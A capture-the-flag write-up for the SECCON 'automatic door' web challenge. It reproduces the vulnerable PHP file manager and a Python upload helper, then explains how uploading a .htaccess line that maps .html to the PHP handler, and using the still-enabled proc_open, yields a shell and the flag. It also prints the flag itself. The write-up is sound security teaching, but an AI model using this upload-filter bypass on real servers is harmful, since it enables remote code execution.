# automatic door (web, 500p)

in the task we get the source code of a webpage we can access:

```php
 <?php
$fail = str_repeat('fail', 100);
$d = 'sandbox/fail_' . sha1($_server['remote_addr'] . '95aca804b832f4c329d8c0e7c789b02b') . '/';
@mkdir($d);

function read_ok($f)
{
    return strstr($f, 'fail_') === false &&
        strstr($f, '/proc/') === false &&
        strstr($f, '/dev/') === false;
}

function write_ok($f)
{
    return strstr($f, '..') === false && read_ok($f);
}

function getdirectorysize($path)
{
    $bytestotal = 0;
    $path = realpath($path);
    if ($path !== false && $path != '' && file_exists($path)) {
        foreach (new recursiveiteratoriterator(new recursivedirectoryiterator($path, filesystemiterator::skip_dots)) as $object) {
            $bytestotal += $object->getsize();
        }
    }
    return $bytestotal;
}

if (isset($_get['action'])) {
    if ($_get['action'] == 'pwd') {
        echo $d;

        exit;
    }
    else if ($_get['action'] == 'phpinfo') {
        phpinfo();

        exit;
    }
    else if ($_get['action'] == 'read') {
        $f = $_get['filename'];
        if (read_ok($f))
            echo file_get_contents($d . $f);
        else
            echo $fail;

        exit;
    } else if ($_get['action'] == 'write') {
        $f = $_get['filename'];
        if (write_ok($f) && strstr($f, 'ph') === false && $_files['file']['size'] < 10000) {
            print_r($_files['file']);
            print_r(move_uploaded_file($_files['file']['tmp_name'], $d . $f));
        }
        else
            echo $fail;

        if (getdirectorysize($d) > 10000) {
            rmdir($d);
        }

        exit;
    } else if ($_get['action'] == 'delete') {
        $f = $_get['filename'];
        if (write_ok($f))
            print_r(unlink($d . $f));
        else
            echo $fail;

        exit;
    }
}

highlight_file(__file__);
```

we can read/write files and we need to get a shell.
we can't save files with `ph` in same so no `.php` files for us.

we've made a small script to upload files:

```python
def upload_file(filename):
    with codecs.open(filename, "r") as f:
        res = requests.post(
            "http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/?action=write&filename=" + filename,
            files={"file": f})
        print(res.text)
```

it seems we can upload a `.htaccess` file with:

```
addtype application/x-httpd-php .html .htm
```

inside and the system will execute php also in html files.
now we can upload html file with a php shell, but according to phpinfo() most of shell-like functions are disabled.
fortunately not all of them -> http://php.net/manual/en/function.proc-open.php is still available.

we run `/flag_x` as stated in the task description and we recover the flag `seccon{f6c085facd0897b47f5f1d7687030ae7}`
